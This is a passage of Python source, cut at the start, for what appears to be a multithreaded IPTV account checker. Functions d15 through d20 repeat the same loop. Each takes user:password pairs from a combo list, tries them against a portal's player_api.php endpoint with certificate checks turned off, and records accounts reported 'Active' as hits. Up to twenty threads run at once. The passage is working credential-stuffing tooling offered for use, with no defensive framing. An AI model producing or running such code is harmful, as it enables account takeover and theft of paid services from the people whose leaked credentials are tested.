                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d15():
    global hit
    say = 0
    for fyz in range(15, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '15'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d16():
    global hit
    say = 0
    for fyz in range(16, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '16'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d17():
    global hit
    say = 0
    for fyz in range(17, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '17'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d18():
    global hit
    say = 0
    for fyz in range(18, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '18'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d19():
    global hit
    say = 0
    for fyz in range(19, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '19'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


def d20():
    global hit
    say = 0
    for fyz in range(20, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(':')
            try:
                user = str(fyzz[0].replace(' ', ''))
            except:
                userr = 'ckwizboss'

            try:
                pas = str(fyzz[1].replace(' ', ''))
                pas = str(pas.replace('\n', ''))
            except:
                pas = 'ckwizboss'

            say = int(say) + 1
            bot = '20'
            oran = ''
            oran = round(fyz / uz * 100, 2)
            echox(user, pas, bot, fyz, oran, hit)
            link = 'http://' + portal + '/player_api.php?username=' + user + '&password=' + pas + '&type=m3u'
            bag1 = 0
            veri = ''
            while 1:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()

            veri = str(res.text)
            if 'username' in veri:
                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', '')
                if status == 'Active':
                    print(' HITCK ')
                    hit = hit + 1
                    onay(veri, user, pas)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t16 = threading.Thread(target=d16)
t17 = threading.Thread(target=d17)
t18 = threading.Thread(target=d18)
t19 = threading.Thread(target=d19)
t20 = threading.Thread(target=d20)
t1.start()
if botsay == 2 or botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t2.start()
if botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t3.start()
if botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t4.start()
if botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t5.start()
if botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t6.start()
if botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t7.start()
if botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t8.start()
if botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t9.start()
if botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t10.start()
if botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t11.start()
if botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t12.start()
if botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t13.start()
if botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t14.start()
if botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t15.start()
if botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t16.start()
if botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20:
    t17.start()
if botsay == 18 or botsay == 19 or botsay == 20:
    t18.start()
if botsay == 19 or botsay == 20:
    t19.start()
if botsay == 20:
    t20.start()
# global current_time ## Warning: Unused global
# global time_ ## Warning: Unused global